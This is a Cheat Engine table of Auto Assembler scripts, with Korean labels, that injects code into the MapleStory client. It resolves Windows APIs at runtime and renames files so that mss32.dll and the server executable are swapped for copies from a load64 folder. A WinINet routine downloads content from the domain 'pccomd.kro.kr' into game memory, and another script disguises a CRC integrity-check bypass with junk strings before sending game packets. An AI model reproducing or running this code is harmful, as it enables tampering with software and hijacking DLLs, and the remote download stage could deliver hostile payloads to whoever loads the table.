<?xml version="1.0" encoding="utf-8"?>
<CheatTable CheatEngineTableVersion="38">
  <CheatEntries>
    <CheatEntry>
      <ID>294</ID>
      <Description>"함수 제작기"</Description>
      <Options moHideChildren="1"/>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]



1805000:
db '.\load64\mss32.img' 00 00 00 00 00 00
1805060:
db '.\load64\Classic_server.img' 00 00 00 00 00
1805160:
db 'Classic_server.img' 00 00 00 00 00
18051C0:
db 'Classic_server.exe' 00 00
18051F5:
db 'Download success' 0A 00
18052C0:
db 'back_up_no_click.exe' 00 00 00 00 00
1805400:
db '.\load64\Classic_server.img' 00 00 00 00 00
01801050:
db '.\load64\back_up_no_click.img' 00 00 00 00 00 00






//jil15 create 01A00C10
1805480:
db '.\Data\Skill\MobSkill.img' 00
//consol list
01400800:
db 'CONOUT$' 00
0146C700:
db 0A 00
0146C600:
db 'w' 00
//poitner list
019E0FEE: //mainbaswe
dd 019E0FFA
019E0FFE: //start
dd 01F01000
define(dumpin,00C84400)
Registersymbol(dumpin)
define(downcontrol,01790240)
Registersymbol(downcontrol)
define(downlack,0171A82B)
Registersymbol(downlack)
define(DownCount,01430608)
Registersymbol(DownCount)
define(subpointers,01978EF1)
Registersymbol(subpointers)
define(domainX,01978F01)
Registersymbol(domainX)
define(diret,01401f00)
Registersymbol(diret)
define(diret2,01401F60)
Registersymbol(diret2)
label(put)
define(datasub,01A08F80)
Registersymbol(datasub)
define(dllloads,01A00F80)
Registersymbol(dllloads)
define(dmomainapi,016FF350)
Registersymbol(dmomainapi)
define(inter,01400000)
Registersymbol(inter)
define(count,01608060)
Registersymbol(count)
define(subcount,01403008)
Registersymbol(subcount)
define(base,01608290)
Registersymbol(base)
define(Mesagas,01788027)
Registersymbol(Mesagas)
define(zerop,018C0769)
Registersymbol(zerop)
define(meesgeA,01506980)
Registersymbol(meesgeA)
define(zemogd,01506880)
Registersymbol(zemogd)
define(Resumes,00BFE9FC)
Registersymbol(Resumes)
define(ThreadGet,01787F8E)
Registersymbol(ThreadGet)
//defi//00C3BC39 txt = mss32.dll &lt;&lt; load
define(MapleHands,00C3BC39)
Registersymbol(MapleHands)
define(loadL,00BFE9C0)
Registersymbol(loadL)
define(SuspendA,00BFEA00) //kkernel32.SuspendThread
Registersymbol(SuspendA)
define(dointer,0150402C) //kernel32.BaseThreadInitThunk+12
Registersymbol(dointer)
define(highter,0150502C) //kernel32.BaseThreadInitThunk+12
Registersymbol(highter)
define(PathPrintf,01413000)
Registersymbol(PathPrintf)
define(PathPrintf,01413000)
Registersymbol(PathPrintf)
define(domainpointer,017EA000) // domainPilter
Registersymbol(domainpointer)
define(domainPilter,017f3000) // domainPilter
Registersymbol(domainPilter)
define(domadata,01711000) // domainsaveaddress
Registersymbol(domadata)
define(saves,019E1002) // domainsaveaddress
Registersymbol(saves)
define(saves2,017E1002) // domainsaveaddress
Registersymbol(saves2)

define(ErrorV,01505CC0) // wininet.InternetCloseHandle
Registersymbol(ErrorV)
define(Errorapi,01850BDD) // wininet.InternetCloseHandle
Registersymbol(Errorapi)
define(interclsoe,00B10314) // wininet.InternetCloseHandle
Registersymbol(interclsoe)
define(crccontrol,018C105C) // crccontrolapiname
Registersymbol(crccontrol)
define(crcbase,018A0F47) // crcbase +1
Registersymbol(crcbase)
define(allooo,013fff00) // allooo
Registersymbol(allooo)
define(sendr,00B10300) // WININET.HttpSendRequestA }
Registersymbol(sendr)
define(sendr,00B10300) // WININET.HttpSendRequestA }
Registersymbol(sendr)
define(Requ,00B10310) // WININET.HttpOpenRequestA }
Registersymbol(Requ)
define(Conc,00B1030C)  //-wininet.InternetConnectA
Registersymbol(Conc)
define(closeh,00B100FC)  { -&gt;kernel32.CloseHandle }
Registersymbol(closeh)
define(handlev,013FEDE8) //handle
Registersymbol(handlev)
define(writef,00BFEA9C) //{ -&gt;kernel32.WriteFile }
Registersymbol(writef)
define(interread,01505024) ///WININET.InternetReadFile }
Registersymbol(interread)
define(addfilea,01505028) ////kernel32.movfilea
Registersymbol(addfilea)
define(creafd,00BFEA94) ////kernel32.CreateFileA
Registersymbol(creafd)
define(openrul,01505020) ////URL
Registersymbol(openrul)
define(openi,00B10304) ////WININET.InternetOpenA
Registersymbol(openi)
define(Thid,00BFE9F4) //// GetCurrentThreadId
Registersymbol(Thid)
define(Thid,00BFE9F4) //// GetCurrentThreadId
Registersymbol(Thid)
define(boxa,00B102CC) //USER32.MessageBoxA
Registersymbol(boxa)
define(opens,0150501C) //USER32.MessageBoxA shell32.ShellExecuteA
Registersymbol(opens)
define(my_zemog,013d3B43) //datalist
Registersymbol(my_zemog)
define(my_messg,013d3C43) //datalist
Registersymbol(my_messg)
define(apicall,013d3A43) //datalist
Registersymbol(apicall)
define(filename,013d3A43) //datalist
Registersymbol(filename)
define(skilldataGet,00C83B83) //datalist
Registersymbol(skilldataGet)
define(skilldataGet,00C83B83) //datalist
Registersymbol(skilldataGet)
define(apiX7F,00A7C710) //apicall
Registersymbol(apiX7F)
define(dataaad,00BFFBA8) //imginter
Registersymbol(dataaad)
define(xd,00BF5FEA) //Ma
Registersymbol(xd)
define(savaskill,013F00C1) //imginter
Registersymbol(savaskill)
define(Tir,013cFAD0) //imginter
Registersymbol(Tir)
define(based,0167E000) //sleep Won
Registersymbol(based)
define(api,00A730B8) //sleep Won
Registersymbol(api)
define(sleepde,00BFEA34) //sleep Won
Registersymbol(sleepde)
define(sleepde2,00B10178)//복붙 안됌;;;
Registersymbol(sleepde2)
define(subsleep,00B10178)
Registersymbol(subsleep)
define(crea,00B100C8) //CreateThread
Registersymbol(crea)
define(handle,00BFE9C8) //{ -&gt;kernel32.GetModuleHandleA }
Registersymbol(handle)
define(Getpro,00BFE9C4) //{ -&gt;kernel32.GetProcAddress }
Registersymbol(Getpro)
define(ker,00C3B45E) //{ -&gt;kernel32.GetProcAddress }
Registersymbol(ker)//
define(shi,00C3BC02) //shell32.dll
Registersymbol(shi)//
define(ntlist,01502600)
Registersymbol(ntlist)
define(allocd,01505600)
Registersymbol(allocd)
define(apic,01535200)
Registersymbol(apic)
define(apilist,01505000)
Registersymbol(apilist)





1901000:
db 6a 01
push 01801050
push c3bc39
call [01505028]
push 200
call [sleepde2]
db 6a 01
push c3bc39
push 1805000
call [01505028]
db 6a 01
push 18052C0
push 18051C0
call [01505028]
push 200
call [sleepde2]
db 6a 01
push 18051C0
push 1805400
call [01505028]
ret


my_zemog:
db 27 BF A1 B7 AF 20 C4 DA B5 E5 20 34 43 34 27 00 20 C6 D0 00 00
my_messg:
db B1 CD C7 CF B4 C2 20 43 2B 2B C0 E7 B9 E8 C6 F7 20 C6 D0 C5 B0 C1 F6 B8 A6 20 BC B3 C4 A1 20 C7 CF BC C5 BE DF 20 C7 D5 B4 CF B4 D9 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
filename:
db 'https://www.microsoft.com/ko-kr/download/details.aspx?id=48145' 00
allocd-C0:
db 'mss32.dll' 00
allocd-80:
db 'NameSpace.dll' 00
allocd-40:
db 'IsWow64Process' 00
ntlist:
db 'ntdll.dll' 00 25 64 20 0A 25 64
allocd:
db '_alloca_probe' 00

allocd+40:
db 'AllocConsole' 00
ntlist+80:
db 'msvcrt.dll' 00 25 64 20 0A 25 64
allocd+80:
db '__p__iob' 00
ntlist+C0:
db 'msvcrt.dll' 00 25 64 20 0A 25 64
allocd+C0:
db 'freopen' 00
ntlist+100:
db 'msvcrt.dll' 00 25 64 20 0A 25 64
allocd+100:
db 'printf' 00
allocd+140:
db 'TerminateThread' 00
allocd+180:
db 'MoveFileExA' 00
allocd+1C0:
db 'ShellExecuteA' 00

ntlist+200:
db 'wininet.dll' 00 25 64 20 0A 25 64
allocd+200:
db 'InternetOpenUrlA' 00
ntlist+240:
db 'wininet.dll' 00 25 64 20 0A 25 64
allocd+240:
db 'InternetReadFile' 00
ntlist+280:
db 'wininet.dll' 00 25 64 20 0A 25 64
allocd+280:
db 'MoveFileExA' 00

allocd+2C0:
db 'tes' 0
allocd+300: //path
db 'https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-5m/view?usp=sharing' 00
allocd+400:
db AC E1 AC E2 AC DA AC DE AC D6 AC E2 2E 6A 70 67 00 00 00//'100.img' 00 //filename
allocd+490:
dd 1
allocd+4C0:
dd 1203C947 //%x


////////domain
allocd+500: //01 010 1
db 01 01 01 01 01 01 01 01 01 00 00 00

allocd+540: // URL
db 'InetURL/1.0' 00
allocd+580: //20
dd #32

allocd+5C0: //dmomain
db 'pccomd.kro.kr' 00

01978EFD:
dd allocd+5C0 //basefunfix
subpointers:
dd 01978EF1+C //pointeradd


//db 'abandonw.tistory.com/' 00
//db 'abandonw.tistory.com' 00

allocd+600: //47
dd #47

allocd+640: //Get
dd #5522759

allocd+680:
//dd #5522759
allocd+6C0: //Get Error value
//dd #5522759

 //Dwonlaod string
allocd+7C0:
db 0A 'Abnadon Ware download controller is launched.' 0A 00

allocd+8C0:
db 'Data accumulator' 0A 00

allocd+950:
db 'MS api Inverse' 0A 00

allocd+9C0:
db 'all clear' 0A 00

allocd+1000:
//consu

allocd+1040:
//consu
allocd+1080:
//consu
allocd+1380:
//consu
001801000: //sum
db '.\Data\Skill\Dragon\cc.jpg' 00
//allocd+1020
zemogd:
db BE F7 B5 A5 C0 CC C6 AE 20 56 65 72 2E 30 31 00 AE C0 C7 00 00
meesgeA:
db BB F5 20 B9 F6 C0 FC C0 CC 20 B3 AA BF D4 BD C0 B4 CF B4 D9 2E 0D 0A BE F7 B5 A5 C0 CC C6 AE B8 A6 20 BD C3 C0 DB C7 D5 B4 CF B4 D9 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00


saves:
dd saves2

saves+4:
dd saves2+8900


dllloads:
db '.\load64\mfc140ud.dll' 0
dllloads+40:
db '.\load64\msvcp140d.dll' 0
dllloads+80:
db '.\load64\ucrtbased.dll' 0
dllloads+C0:
db '.\load64\vcruntime140d.dll' 0

dllloads+100:
db '.\load32\mfc140ud.dll' 0
dllloads+140:
db '.\load32\msvcp140d.dll' 0
dllloads+180:
db '.\load32\ucrtbased.dll' 0
dllloads+1C0:
db '.\load32\vcruntime140d.dll' 0


diret2:
push ebp
mov ebp,esp
sub esp,08
mov [ebp-04],ecx
mov eax,[ebp-04]
mov [ebp-08],eax
mov ecx,[ebp-04]
movzx edx,byte ptr [ecx]
test edx,edx
je put
call dword ptr [Thid]// GetCurrentThreadId
jne put
nop
put:
mov esp,ebp
pop ebp
ret

diret:
repne jne diret+5
repne ret
push ebp
mov ebp,esp
sub esp,00
push eax



define(te,015058C0)
Registersymbol(te)
define(filepa,01505900)
Registersymbol(filepa)
define(namesk,01505A00)
Registersymbol(namesk)
define(won,01505A90)
Registersymbol(won)
define(meta,01505AC0)
Registersymbol(meta)


apic:
push allocd-40
push ker //ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist-4],eax

push allocd
push ntlist
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist],eax



push allocd+40
push ker //ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+4],eax
push allocd+80
push ntlist+80
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+8],eax
push allocd+C0
push ntlist+C0
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+C],eax
push allocd+100
push ntlist+100
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+10],eax
push allocd+140
push ker //ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+14],eax

push allocd+180
push ker //ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+18],eax

push allocd+1C0
push shi //ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+1C],eax
push allocd+200
push ntlist+200
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+20],eax
push allocd+240
push ntlist+240
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+24],eax

push allocd+280
push ker
call dword ptr [handle]
push eax
call dword ptr [Getpro]
mov [apilist+28],eax
mov eax,[esp]
mov [apilist+2C],eax
ret

createThread(apic)

 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>300</ID>
          <Description>"ntdll.alloca_probe "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>308</ID>
          <Description>"kernel32.AllocConsole "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>301</ID>
          <Description>"msvcrt._p__iob "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>305</ID>
          <Description>"msvcrt.freopen "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>306</ID>
          <Description>"msvcrt.printf "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>307</ID>
          <Description>"kernel32.TerminateThread "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>322</ID>
          <Description>"MoveFileA"</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>325</ID>
          <Description>"shell32.ShellExecuteA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>333</ID>
          <Description>"wininet.InternetOpenUrlA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>01505020</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>334</ID>
          <Description>"wininet.InternetReadFile "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>335</ID>
          <Description>"kernel32.MoveFileA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>405</ID>
          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>472</ID>
          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist-4</Address>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>509</ID>
      <Description>"crc 스타트"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
define(crcs,600005E2)//00C84900)
RegistersymboL(crcs)
label(goto1)
label(goto2)
label(goto3)
label(goto4)
label(exit)
label(HelloWorld)

014fCFF7:
dd 00
dd 00//Packet
dd 2//Size
dd 00
014fCFF7+4:
dd 0040CFF7//PacketPointer //ff 74



crcs:
mov eax,00201000 //00A24F0C
add eax,00200000
jmp goto1
db '35 223a235a23 4a 234a wer sd ewf afsda sdf asdf asdffsd wsdfsafw'
goto1:
xor esi,esi
xx:
cmp esi,00720000
jae exit
jmp goto2
db 'sdgagadsgasdgasdagsddrfasasfasfsfafasasffasfas'
goto2:
mov ebx,[eax]
jmp goto3
db 'aouiyioyuuioyyuiooyuiioyuyuios23123131231231231233123ffasfas'
goto3:
//rol ebx,05
jmp goto4
db 'fghkfkghkfghkfghkfghfhkgfghkfghkfghksfasfsfafasasffasfas'
goto4:
//xor ebx,ebx
xx2:
mov edx,[00C85000+esi]
rol ebx,04
jmp goto5
db 'fdgjggjfgjdfgjdffgjdasf41212441241224142dfgjdfgjdfgjfgdjfdgjsasfasfsfafasasffasfas'
goto5:
cmp edx,ebx
jne 0
add eax,04
add esi,04
jmp xx
exit:
xor edx,edx
xor esi,esi
xor eax,eax
push HelloWorld
mov ecx,[MapleStory.exe+7F9F50]
push 014fCFF7//16bytes
push HelloWorld//FakeReturn(ret)
jmp 0049AC22//SendFunction //call address
HelloWorld://End of Function
ret
db 90 90 CC CC CC CC CC CC CC CC CC CC CC C7


createThread(600005E2)

[DISABLE]
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>466</ID>
      <Description>"함수 작동기 스타트"</Description>
      <Options moHideChildren="1"/>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]

define(dump,00C84600)
Registersymbol(dump)
define(dumpin,00C84400)
Registersymbol(dumpin)
label(stop)
label(stop2)
define(apisave1,00C84500)
Registersymbol(apisave1)
define(apisavedata,00BFEE1C) //bug alloc
Registersymbol(apisavedata)

dump:
inc [dumpin+900]
cmp [dumpin+900],#6000
jae stop2
cmp [dumpin+8FC],1
je stop
mov [dumpin+904],eax
mov [dumpin+908],ebx
mov [dumpin+90C],ecx
mov [dumpin+910],edx
mov [dumpin+914],edi
mov [dumpin+918],esi
mov [dumpin+91C],esp
mov [dumpin+920],ebp
xor eax,eax
mov eax,00C84000-80000
add eax,80000
push 0
push 0
push eax
push eax
push 0
push 0
mov eax,[dumpin+904]
call [crea]
mov eax,[dumpin+904]
mov ebx,[dumpin+908]
mov ecx,[dumpin+90C]
mov edx,[dumpin+910]
mov edi,[dumpin+914]
mov esi,[dumpin+918]
mov esp,[dumpin+91C]
mov ebp,[dumpin+920]
xor eax,eax
mov eax,01C84300-80000 //'ijl15.dll' 00 Get
add eax,80000
push 0
push 0
push eax
push eax
push 0
push 0
mov eax,[dumpin+904]
call [crea]
mov eax,[dumpin+904]
mov ebx,[dumpin+908]
mov ecx,[dumpin+90C]
mov edx,[dumpin+910]
mov edi,[dumpin+914]
mov esi,[dumpin+918]
mov esp,[dumpin+91C]
mov ebp,[dumpin+920]
xor eax,eax
mov eax,ThreadGet-80000
add eax,80000
push 0
push 0
push eax
push eax
push 0
push 0
mov eax,[dumpin+904]
call [crea]
mov eax,[dumpin+904]
mov ebx,[dumpin+908]
mov ecx,[dumpin+90C]
mov edx,[dumpin+910]
mov edi,[dumpin+914]
mov esi,[dumpin+918]
mov esp,[dumpin+91C]
mov ebp,[dumpin+920]

xor eax,eax
mov eax,01603037-80000
add eax,80000
push 0
push 0
push eax
push eax
push 0
push 0
mov eax,[dumpin+904]
call [crea]
mov eax,[dumpin+904]
mov ebx,[dumpin+908]
mov ecx,[dumpin+90C]
mov edx,[dumpin+910]
mov edi,[dumpin+914]
mov esi,[dumpin+918]
mov esp,[dumpin+91C]
mov ebp,[dumpin+920]
mov [dumpin+8FC],1
stop:
jmp [sleepde2]

stop2:
mov [dumpin+904],eax
mov [dumpin+908],ebx
mov [dumpin+90C],ecx
mov [dumpin+910],edx
mov [dumpin+914],edi
mov [dumpin+918],esi
mov [dumpin+91C],esp
mov [dumpin+920],ebp
xor eax,eax
mov eax,[01A00C10]
add eax,5E2 ///crc
push 0
push 0
push eax
push eax
push 0
push 0
mov eax,[dumpin+904]
call [crea]
mov [dumpin+900],0
mov eax,[dumpin+904]
mov ebx,[dumpin+908]
mov ecx,[dumpin+90C]
mov edx,[dumpin+910]
mov edi,[dumpin+914]
mov esi,[dumpin+918]
mov esp,[dumpin+91C]
mov ebp,[dumpin+920]
jmp [sleepde2]
[DISABLE]

</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>467</ID>
          <Description>"ntdll.alloca_probe "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>468</ID>
          <Description>"kernel32.AllocConsole "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>469</ID>
          <Description>"msvcrt._p__iob "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>470</ID>
          <Description>"msvcrt.freopen "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>471</ID>
          <Description>"msvcrt.printf "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>488</ID>
          <Description>"kernel32.TerminateThread "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>489</ID>
          <Description>"MoveFileA"</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>474</ID>
          <Description>"shell32.ShellExecuteA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>475</ID>
          <Description>"wininet.InternetOpenUrlA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>01505020</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>476</ID>
          <Description>"wininet.InternetReadFile "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>477</ID>
          <Description>"kernel32.MoveFileA "</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
        <CheatEntry>
          <ID>478</ID>
          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
          <ShowAsHex>1</ShowAsHex>
          <ShowAsSigned>1</ShowAsSigned>
          <VariableType>4 Bytes</VariableType>
          <Address>apilist+4+4+4+4+4+4+4+4+4+4+4</Address>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>352</ID>
      <Description>"도메인연동 오리지널"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//createThread(dmomainapi)
//dmomainapi+2c9es
label(subhtt2)
label(Endf)
label(retd)
label(retda)
label(goto8)
label(goto9)
label(petds)
label(goto11)
label(goto12)
label(incs)
label(fufu)
label(fufu2)
label(fufu3)



domadata:
dd #10000
dmomainapi:
mov [dointer+4],eax
mov [dointer+8],ebx
mov [dointer+C],ecx
mov [dointer+10],edx
mov [dointer+14],edi
mov [dointer+18],esi
mov [dointer+1C],esp
mov [dointer+20],ebp
push ebp
mov ebp,esp
push -01
mov eax,fs:[00000000]
push eax
mov eax,00011810
call fufu
push ebx
push esi
push edi
lea edi,[ebp-0001181C]
mov ecx,00004604
mov eax,CCCCCCCC
repe stosd
xor eax,ebp
mov [ebp-10],eax
push eax
lea eax,[ebp-0C]
mov fs:[00000000],eax
mov ecx,allocd+500// 01 01 01 01 01 01 01 01 01 00 00 00
call diret2 // { -&gt;kernel32.GetCurrentThreadId }
mov esi,esp
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
push allocd+540 { ("InetURL/1.0") }
call dword ptr [openi] { -&gt;WININET.InternetOpenA }
cmp esi,esp
call diret //repne jne
mov [ebp-18],eax
mov [allooo+8],eax
mov esi,esp
push 00 { 0 }
push 00 { 0 }
push 03 { 3 }
push allocd+580{ (32) }
push allocd+580 { (32) }
push 50 { 80 }
mov [dointer-18],esi
mov [dointer-1C],ebx
mov ebx,[subpointers-60]
mov esi,[subpointers]
mov esi,[esi+ebx]
push esi
add [subpointers-60],4
mov esi,[dointer-18]
mov ebx,[dointer-1C]
subhtt2:
mov eax,[ebp-18]
push eax
call dword ptr [Conc] { -&gt;WININET.InternetConnectA }
cmp esi,esp
call diret //repne jne
mov [ebp-24],eax
mov [allooo+4],eax
mov esi,esp
push 00 { 0 }
push 00400000 { (9460301) }
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
push allocd+600 { (47) }
push allocd+640 { (5522759) } //Get
mov eax,[ebp-24]
push eax
call dword ptr [Requ] { -&gt;WININET.HttpOpenRequestA }
cmp esi,esp
call diret
mov [ebp-30],eax
mov [allooo],eax
lea ecx,[ebp-000111CC]
mov [ebp-04],00000000 { 0 }
mov esi,esp
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
push 00 { 0 }
mov eax,[ebp-30]
push eax
call dword ptr [sendr] { -&gt;WININET.HttpSendRequestA }////
//////////////////////////////////
putX:
//call diret
mov [ebp-000111D8],00000000{ 0 }
mov [ebp-000111E4],00000000 { 0 }

retd:
mov esi,esp
push domadata
push #70000//사이즈
mov [dointer-28],edi
mov [dointer-2C],ebx
mov ebx,[subpointers-60] //sub
mov edi,[019E0FFA+ebx]
push edi
mov edi,[dointer-28]
mov ebx,[dointer-2C]
mov edx,[ebp-30]
push edx //클로즈할 핸들러
call dword ptr [interread] // { -&gt;WININET.InternetReadFile }
mov ebx,[subpointers-60] //sub
mov edi,[019E0FFA+ebx]
cmp [edi],0
je retda
push [allooo]
call dword ptr [interclsoe]
push [allooo+4]
call dword ptr [interclsoe]
push [allooo+8]
call dword ptr [interclsoe]
push #120
call [sleepde2]
cmp [dmomainapi-98],1
je goto9
cmp [dmomainapi-90],1
je goto8
xor esi,esi
lea eax,[01F00FF8]
gotoF:
inc esi
cmp [eax+esi],'{}}C' //1code
jne gotoF
cmp [eax+esi+4],'CDFG' //2code// +1
jne gotoF
lea edi,[eax+esi+9]
mov [domainX],edi
goto11:
dec eax
gotoFS:
inc esi
cmp [eax+esi+4],'{}}@' //exit
jne gotoFS
mov [eax+esi+4],0
lea edi,[eax+esi+8]
mov [domainX+4],edi
dec eax
Endf:
inc esi
cmp [eax+esi],'find' //exit
jne Endf
gotoFG:
mov [eax+esi],0
mov eax,[dointer+4]
mov ebx,[dointer+8]
mov ecx,[dointer+C]
mov edx,[dointer+10]
mov edi,[dointer+14]
mov esi,[dointer+18]
mov esp,[dointer+1C]
mov ebp,[dointer+20]
mov [dmomainapi-90],1
push 0
push 0
push dmomainapi
push dmomainapi
push 0
push 0
call [crea]
mov eax,[highter]
mov [esp],eax
ret


retda:
mov edi,[dointer-28]
mov ebx,[dointer-2C]
jmp retd

goto8:
xor esi,esi
xor esi,esi
xor edx,edx
mov [dmomainapi-98],1
mov ebx,[subpointers-60] //sub
mov edi,[019E0FFA+ebx]
goto12:
inc esi
cmp [edi+esi],0
je petds
cmp byte ptr [edi+esi],0D
jne goto12
cmp byte ptr [edi+esi+1],0A
jne goto12
mov byte ptr [edi+esi],0
mov byte ptr [edi+esi+1],0
lea eax,[edi+esi+2]
mov [0143070C+edx],eax
inc [01430608]
add edx,4
jmp goto12

petds:
mov eax,[dointer+4]
mov ebx,[dointer+8]
mov ecx,[dointer+C]
mov edx,[dointer+10]
mov edi,[dointer+14]
mov esi,[dointer+18]
mov esp,[dointer+1C]
mov ebp,[dointer+20]
push 0
push 0
push dmomainapi
push dmomainapi
push 0
push 0
call [crea]
mov eax,[highter]
mov [esp],eax
ret

goto9:
mov eax,[dointer+4]
mov ebx,[dointer+8]
mov ecx,[dointer+C]
mov edx,[dointer+10]
mov edi,[dointer+14]
mov esi,[dointer+18]
mov esp,[dointer+1C]
mov ebp,[dointer+20]
push 0
push 0
push downcontrol
push downcontrol
push 0
push 0
call [crea]
incs2:

xor esi,esi
incs:
add esi,4
